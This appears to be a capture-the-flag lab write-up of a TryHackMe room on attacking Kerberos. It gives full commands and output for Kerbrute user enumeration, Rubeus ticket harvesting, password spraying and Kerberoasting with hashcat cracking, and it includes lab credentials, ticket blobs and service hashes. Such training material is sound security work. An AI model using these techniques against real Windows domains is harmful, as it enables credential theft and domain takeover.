---
Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller
---

# Attacking Kerberos — Writeup

## Overview
### Attacking Kerberos — Writeup
### Attacking Kerberos — Writeup
﻿﻿﻿This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we'll cover the following:
Initial enumeration using tools like Kerbrute and Rubeus
Kerberoasting
AS-REP Roasting with Rubeus and Impacket
Golden/Silver Ticket Attacks
Pass the Ticket
Skeleton key attacks using mimikatz
This room will be related to very real-world applications and will most likely not help with any CTFs however it will give you great starting knowledge of how to escalate your privileges to a domain admin by attacking Kerberos and allow you to take over and control a network.
It is recommended to have knowledge of general post-exploitation, active directory basics, and windows command line to be successful with this room.
![|444](https://i.imgur.com/2dq2jLY.png)
What is Kerberos? -
Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.
Common Terminology -
Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
AS-REQ w/ Pre-Authentication In Detail -
The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.
Ticket Granting Ticket Contents -
In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.
![](https://i.imgur.com/QFeXDN0.png)
Service Ticket Contents -
To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.
Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.
![](https://i.imgur.com/kUqrVBa.png)
Kerberos Authentication Overview -
![](https://i.imgur.com/VRr2B6w.png)
AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
AP-REP - 6.) The service grants access
Kerberos Tickets Overview -
The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.
Attack Privilege Requirements -
Kerbrute Enumeration - No domain access required
Pass the Ticket - Access as a user to the domain required
Kerberoasting - Access as any user required
AS-REP Roasting - Access as any user required
Golden Ticket - Full domain compromise (domain admin) required
Silver Ticket - Service hash required
Skeleton Key - Full domain compromise (domain admin) required
To start this room deploy the machine and start the next section on enumeration w/ Kerbrute
This Machine can take up to 10 minutes to boot
and up to 5 minutes to SSH or RDP into the machine
What does TGT stand for?
*Ticket Granting Ticket*
What does SPN stand for?
*Service Principal Name*
What does PAC stand for?
*Privilege Attribute Certificate *
What two services make up the KDC?
*AS, TGS*

## Enumeration
Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.
For more information on enumeration using Kerbrute check out the Attacktive Directory room by Sq00ky - https://tryhackme.com/room/attacktivedirectory
You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.59.104  CONTROLLER.local
Abusing Pre-Authentication Overview -
By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.
![](https://i.imgur.com/2IomUnH.jpg)
Kerbrute Installation -
1.) Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases
2.) Rename kerbrute_linux_amd64 to kerbrute
3.) chmod +x kerbrute - make kerbrute executable
Enumerating Users w/ Kerbrute -
Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.
1.) cd into the directory that you put Kerbrute
2.) Download the wordlist to enumerate with here
3.) ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt - This will brute force user accounts from a domain controller using a supplied wordlist
![](https://i.imgur.com/fSDrhyb.png)
Now enumerate on your own and find the rest of the users and more importantly service accounts.
```text
cat /etc/hosts      
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
```
```text
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
```text
┌──(kali㉿kali)-[~/Downloads/learning_kerberos]
└─$ mv kerbrute_linux_amd64 kerbrute
```
```text
┌──(kali㉿kali)-[~/Downloads/learning_kerberos]
└─$ ls
kerbrute  User.txt
```
```text
┌──(kali㉿kali)-[~/Downloads/learning_kerberos]
└─$ chmod +x kerbrute
```
```text
┌──(kali㉿kali)-[~/Downloads/learning_kerberos]
└─$ ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/20/22 - Ronnie Flathers @ropnop

2022/08/20 13:15:16 >  Using KDC(s):
2022/08/20 13:15:16 >   CONTROLLER.local:88

2022/08/20 13:15:17 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2022/08/20 13:15:17 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2022/08/20 13:15:17 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2022/08/20 13:15:18 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2022/08/20 13:15:18 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2022/08/20 13:15:18 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2022/08/20 13:15:18 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2022/08/20 13:15:18 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2022/08/20 13:15:18 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2022/08/20 13:15:18 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2022/08/20 13:15:18 >  Done! Tested 100 usernames (10 valid) in 2.081 seconds
```
How many total users do we enumerate?
*10*
What is the SQL service account name?
*sqlservice*
What is the second "machine" account name?
*machine2*
What is the third "user" account name?
*user3*
dada
### Harvesting & Brute-Forcing Tickets w/ Rubeus
To start this task you will need to RDP or SSH into the machine your credentials are
```text
Username: Administrator 
Password: P@$$W0rd
Domain: controller.local
```
Your Machine IP is 10.10.59.104
Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.
Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.
The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus
Rubeus is already compiled and on the target machine.
![|333](https://i.imgur.com/2KTvdDp.png)
Harvesting Tickets w/ Rubeus -
Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.
1.) cd Downloads - navigate to the directory Rubeus is in
2.) Rubeus.exe harvest /interval:30 - This command tells Rubeus to harvest for TGTs every 30 seconds
![](https://i.imgur.com/VCeyyn9.png)
Brute-Forcing / Password-Spraying w/ Rubeus -
Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.
This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.
Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:
echo 10.10.59.104 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
1.) cd Downloads - navigate to the directory Rubeus is in
2.) Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
![](https://i.imgur.com/WN4zVo5.png)
Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
```text
xfreerdp /u:Administrator /p:'P@$$W0rd' /v:10.10.59.104 /size:90%
```
```enter P@$$W0rd
scp Administrator@10.10.59.104:C:/Users/Administrator/Downloads/mimikatz.exe /home/kali/Downloads/learning_kerberos
```
```get
scp Administrator@10.10.59.104:C:/Users/Administrator/Downloads/Rubeus.exe /home/kali/Downloads/learning_kerberos
```
```text
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe h
arvest /interval:30
 
   ______        _
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds

[*] Refreshing TGT ticket cache (8/20/2022 10:51:53 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  8/20/2022 10:05:33 AM
  EndTime               :  8/20/2022 8:05:33 PM
  RenewTill             :  8/27/2022 10:05:33 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forw
ardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUy
iJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEgnF37ZFGONrzNV
Z5i/186Sdbll3p6GephB3
    YgJLMMvE0VKfMr/X6iD7RciV330ax/2SX1TImIKdfLrueYmfwcMZiwYU6pa8SeoMa1ijzjLWqeg2sqH
r8xdN83TrvXJdRjVYLgVj
    DNspMCEPaGg7Wn51+8Bg0kUUNuGoxDyDzIFcHllUVOmN8bpnHAtpluZxJumgHZKzNz/IqS3PgQzZeRH
1z1KA0Rnub/iu52nfJiqj
    bptnmP5ueWswjuoDdedeLoD2RvAPfA1chAyyi8dHcfllCPrILgKHmgDjZEIB6DBaY6AXSFIb/KttSmV
hkUA4JsfH7TxFJICbWE4/
    hfRE9cxQD7x3ME404mZ4XVvXeTU1xdz6OShOBWLvHbjQr0FcCu1uXfnT7IZkOuHCrocWpaNAwPZJySF
OGPTDdMB+FuJCPYYM5/cz
    CFMCMzYJ4Gy4/XjicuwyU9aNBBixsGhtDEaSCewdqBSyZTm3MHLoQcfBhD9uWahD4zH9DAW8YhzbkKA
v+bWI9R9PrliOzY7ELu06
    xmMKI9Z3YxBdZ9r6/IzlthuOb14iq9zWsGjMlZZ4eSFjEev6anWXX2f11G1OevwMvmVnAMzjlp3FWbW
DMnpvhsiAZT98OTtgk9Hh
    LbN3a2Vw+TW/pRDu/CHWC7mtqrH5gBw4UUpQRSedx+cIJsVLHNRNiAmYRhyxJHEw/pjCftsZ5V/hygY
u+LHH9kFxaJGtxwMkRYYY
    TPf1Gxgoo5lKvyi5WihAZmYgQ/I/bzJDv2L4na4eGWF4HeHe3i2eTAf++VzGPdf3WUoAbypKJDM6+aT
JjKW6XOzA2UF3aeid33Fs
    5A+NfWUrtOjWzo8XQ6k5Kr12KGUknTjq0RDGLZV2oTJ5QRzTvTI3RGFzqcyvcrzRh3Mt+GWUhb1+VDu
w70wlNaxB0dnziTHwo0BI
    dCJD145TeGcKt4irYVr/rk42cw0DHUoIZBKboQK+zcK60aYkAOid4NzYLvGcS7cjV1TuXVPOLEi+7SB
OPpGgzjAi1AWbOJ4tqJB1
    DdLlTdXXfj0xgLPIKOZnf7rZzJ/aqxKwT5sH+spCmEQCgUk7tB3gMDdgyy3EPVybxjLDbY6xB5/xzBA
w5nAQWXSGZk8nrKNuzQ20
    Me3UiDWkkxBIVLGwQX5bK6tlK0Ara5dJE90xM9fpMrU9PZ2+wJ6tqxJbaMoJypIFhyuO4GLV4+yh8SE
XYj6/BTrwZic1YHtpSn6+
    QvH2Zs30+dPkhJMTojN3gyWtQzu27wqzRfYVdjbuTVYpd/qnp+r/LSVg4FR073zRZzGN6MOhTZK7Ojb
ipURGKSMdK0GTAs39iszh
    OZWW0EcMmhg+oOOgjiqA3hg7+2nhIFjf6GGn1upvyfpkWowaKCGHjb6jgfcwgfSgAwIBAKKB7ASB6X2
B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCBmQINdQ2QQ7GhFj8Y+IdfeyhVFaYhkCYkbGvhkpl/CoKESGxBDT05UUk9MTEVSLkx
PQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIyMDgyMDE3MDUzM1qmERgPMjAyMjA4MjEwMzA
1MzNapxEYDzIwMjIwODI3
    MTcwNTMzWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEV
SLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  8/20/2022 10:05:33 AM
  EndTime               :  8/20/2022 8:05:33 PM
  RenewTill             :  8/27/2022 10:05:33 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, fo
rwardable
  Base64EncodedTicket   :
```
```text
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>echo 10.10.5
9.104 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is E203-08FF

 Directory of C:\Users\Administrator\Downloads

05/25/2020  03:45 PM    <DIR>          .
05/25/2020  03:45 PM    <DIR>          ..
05/25/2020  03:45 PM         1,263,880 mimikatz.exe
05/25/2020  03:14 PM           212,480 Rubeus.exe
               2 File(s)      1,476,360 bytes
               2 Dir(s)  50,903,588,864 bytes free

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe b
rute /password:Password1 /noticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest 
[-] Blocked/Disabled user => krbtgt 
[+] STUPENDOUS => Machine1:Password1 
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQ
Uyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKig
gPx
      BIID7YboH9fBS2/dx7r6jjG3nPmmRKcU472qS5zSs+8AxTI7rxpcrmUeZRfPu9A90RcZM/s2YvYFP
vya
      BAO5rxkAS3kehqmGCg84DdKp0C9Ll7rTKxRBYgLwbcX8YzIt5xlFZ9Lqu72ToSLoii00zC1Z7L0xl
hqq
      ooPR5QGJvUIDaPfcKTOWXcgIO+9iSJc6AYAjffcEdLhgnrCHMh8ynyNGQJSF9H1ia/tY0nOw8cfyX
5+M
      0HhFOupZ/aYYEiimBAfP+SGw1IE9hFfAXwVZ5/GXsj0+CZWZXFaLnJHSiten65rCkPaVF8tuxc3/j
fi3
      hMvhxlmj9YbVHFipG1u1TcCV4q6tYbBkl7Eux0FV5Abh3FQrtu54uOLest+ZGjc1YTFGaLcJ3v3K5
bbH
      F41OwGvsFkAeSbxe0PQRPlpw7AIZYy2o3FuVk2INUvEX1ultj2xrhAZYTrP1Nvm9vMzOViNgNhY8U
RAo
      a17GDIcZi7ZuP+f+AbPd//Q17BopL+Sh3ex3K3u24lWV93PL/kEO3ZCpp9LqU88n1eSbUdVYCZmsT
8pL
      TtpC/Gf3SlUoui2RoZNfqaPd6raS20AHtMzIhMkDQ0XuHGyxrwpBhfVzjXuqXtt1rkbVn33tD8G63
Rtt
      /930+5thnVCWbxWn3otMR+zkJIyhr1wxT2xZBqajt0HmVTnU5shUr8Ds6INNASP5GhX7jt5rv/+cs
NXu
      Wy1p0dUo47u6nmGXHPvR+3WpPCL6tQGyBQ6Vg/dIma9CmgrQ8jW46iDA5/p9Q4wXQlptvE2JWDCnp
u8k
      pXz6IuTZrSAJ3kKFKMti2WaDT+WPbnDGvmiq7cnmfsVrO0VB8NZGTRrtX+k77ws5byTAx7coq8SEK
xUm
      Q6eG1kWa0ZzhmF77eRF1+gELxSihooP7MSLu9JBn7ebMo+L6vs7MYm8bASGGVLDZttNZTfLsJim5N
2OV
      Bnk6Kz6BKbp+/w5NnC/Sr8x/4eBrr3x8H2s7bdlfG/utg+tODKcWx5fQxpmNbJJi3hJThlUKpLGD1
2Ip
      hYOVQrWGwu50xZW7mIJYZhq1yBtlGnN3vKpRJutBGWOjMlylOeSxVaa2BjNysQIuyrZCIbYJc4/uH
UUw
      X3yv3e3PgdGzgpMHg5EFzohN940oUTdnvRFNL5JnRS10ILbIcEubgce2dYpH75WvERaa0zXMprOi/
tx8
      lD+9IckGgU/exERtb/GZSs0N7vzucUSqagsO/ISydPvwzt7YBaKaQCsTeYewYpg6HfvZWWmNAUZSS
l6p
      di2/LVZGaqQ5RLrG97JZj04Je070Mp7KZQusYtLZIGQwI1OQ+7xgDpGBJn9m0hTNw6OB8jCB76ADA
gEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIOL511gL+hc53tjbqZHlnlYazE3978+CR
Le1
      sKG/tvaIoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAA
KUR
      GA8yMDIyMDgyMDE3NTQ1NFqmERgPMjAyMjA4MjEwMzU0NTRapxEYDzIwMjIwODI3MTc1NDU0WqgSG
xBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs     

[+] Done
```
Which domain admin do we get a ticket for when harvesting tickets?
*administrator*
Which domain controller do we get a ticket for when harvesting tickets?
*CONTROLLER-1*
### Kerberoasting w/ Rubeus & Impacket
In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.
In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.
I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.
![](https://i.imgur.com/Mtl9O6B.png)
Method 1 - Rubeus
Kerberoasting w/ Rubeus -
1.) cd Downloads - navigate to the directory Rubeus is in
2.) Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users
![](https://i.imgur.com/XZegVqf.pngb)
copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
I have created a modified rockyou wordlist in order to speed up the process download it here
3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
Method 2 - Impacket
Impacket Installation -
Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20
1.) cd /opt navigate to your preferred directory to save tools in
2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
3.) cd Impacket-0.9.19 navigate to the impacket directory
4.) pip install . - this will install all needed dependencies
Kerberoasting w/ Impacket -
1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located
2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.59.104 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
What Can a Service Account do?
After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.
Mitigation - Defending the Forest
![](https://i.imgur.com/YPuNS2X.png)
Kerberoasting Mitigation -
Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.
```text
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2

[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$EF29A7FF22BC30B6C5B574D4AB83766D$C76318A18159C672726507C2CF1C422F64997F 
                             83878BD147FF2711984D60AE04CC85E2E5C95AE8F3F328FB07D299B6ED0A5DA3F205A0A79D6F3689
                             3CAE1E82EA042DA6BE674C95E9DA84A5DB525C1EB01CC5F123F295E64763BA66F2D406E9D84F1F51
                             2DE4C2622603CE3C4E22AD63E5C17E430543F2D8D60902CCA558389EAF1042B8F4D0548F600A14AB
                             8A02ADE6A2F2FE2B59111B4764BE663841E8D851FB81B2709C10A161B33C90198755799CCB6E7E89
                             0AF54E046BDAEE48B9E47C09F54D567891C1640D3FFF04A9137C144E1D2C70C8FD13A71DCFCFE64F
                             B9906BABF1FC392A23CE9AEFF5E23218EC36B8F88C3BE4D860834F3346C03B77DA9AC91554CBE5A6
                             ECA7FA5475C5CCB28BE7F38A0158209ECD8D084F1FD3ABC25AB6B4387FEA999BAAA0AAD69A301FED
                             3948343599FA1491CF9915288DFA3DC19321CBE57F0947FCBD3777011A5DBAA7271126289D2E0E2A
                             55B609B00423301CF5D2C7FBCA16AE7209B9B25FEFAED9DF2D9660DD2B662567371ACF035ADC6427
                             D582822EE6B096FADBAFB9C83B5958FBD946EB9C598E9C8C8B7BD3E6A8143D4803DA035E8958924C
                             D495EF92DE7CE710262BF041DB50C156C858186B15A2ABD5769BFF0D5C95B8D4CB2D165FE94FDAF8
                             E3AED796FC7701EF57B4F4BA190F5B6EE0DF24326974EA56DFB17692875488B6EC72095BDC07743C
                             F4F71B23C523E71953BF1565CD6AD35DD834BF1F196B9197A05EE828C76A1E8E39D5A3C8C77D76DB
                             0A7123F8F666DEBAB4CDC154CDB2405C8FDE9BC41FA65FB304B35082449708EAEB49757C65F3D2D3
                             6CFE2AF136A11112A9E3D11A6658DC2530E9C64324744DB712A7EB0A03CF37AE5DF051E42E0E1CB1
                             00E57A191AD334B1F1E1817702A944B4DAB32F62AC4E5EF9BBE887D7B8722E40831787BD4ADFCC5A
                             EAB2314C532C15104C109A2479563905196D46F05ED7310BAC3D5A115185B279F004BDE036D02904
                             BAE9C8F6467FBB014F6F5399C709456C3CB83707970FD682FCFCBEC4238BA4B3DDAF3E051B0D350A
                             3CFAC61F28F916F0EABEBBBDBDF76D60AEBB917CFB3708353DE5F5629EFD537774AEB276797283B6
                             89B0BA406ECF52F34981EF6C31FD434781BC5A14FFCBB0C76E86E53CA054351E63D7450DB1CB1100
                             7E034D8CC956F0B5AC00137E7F1532CFCAD0FE41AE9FBD6BE7BBA686498C8A003F1481CF567D83F8
                             B0029E049F48236CDE9EBCC554CEC6148D5FCF70393A23440380C8E8C8C21AB65EC58668F1AC6A58
                             C530F76CCC59E3B98862B65F41CD3041E827FADA505FB50C6AA904216BDC37BD4A771A367C5D767D
                             4364C305EDE4EDB67CC874B4E669BD98D4A74DDEB053CA500C0A7BF78FE79652B3C9152D4CADE173
                             6EA9C8751BBF46C2D5CB09499C382BAF70ACFEE1B6FA414867410BE91902689D8322A62F702ED8DB
                             2A19C266400F7513260A5BD67D283492CA66841F171F257511E10E5C1D6DE767C71B57C15B7CE416 
                             398836C34FF05ADC9984C1D60FCC833D0BB2229D196CE8EB9EF14D0D6F108B4716D216B176F13B12
                             4F76F5A570DFAD798450CD399CECC63602531D7A2677082CF93DCBCE1B372B058B0074E8BD9DFAA9
                             4696BFF047AB5ACF084C160C507010E07235586F9BBD668BCE1B13C633

[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$F7DD3784FB36974254037853F8FB85D7$1CB5A844ED086E40FBA10F8C617C66CCEF22
                             077ED9F2F75D8ACD8ED1A4BFB93E42886191B96BCC6F25E5574E9C5975B994A7243F103FBBF7EC81
                             1717BABB20007CAE02D75F7BDCCD3824E7287EE21609073FAE55A890A2830211A63143EC12A68543
                             26260E6D6A27AC3D88C1FF6479623C90ACF0A555F87AE7A12D63F728710A92B70405D0CD715BD645
                             BEF1EC383BD496D2B508570E19CD2E46A2D9188AA484D86E0DC7E2DEB8F8A31D09EBDDD6B01E1134
                             A5B88130490E88F4660209ED1A0DD0D6B6227AFD3E9F83D198EE1BBD487CFAE89C21CE7B387DA8AB
                             CFDAFB5795B614A327F1067D36C50E7905C5EE3C0F2BFCE1E2D7F05EDBB25F6CF2FF46BE9ABA29A7
                             ADD0C780978199736EAFF55C34E8D25D071F59EC6B52D537DA7505B0B3419ABBF3B648203DBC99E8
                             DDCC8E18316BE1B90E82C2244FBCF89434546C714BA74A6A8062326C596A450B9A785D8AC553B7C7
                             12B3832156C611DF23FA5803A02B9E9DD4BB08E4A7C3D4C335AC4E54895B77DB82187A9A5B846727
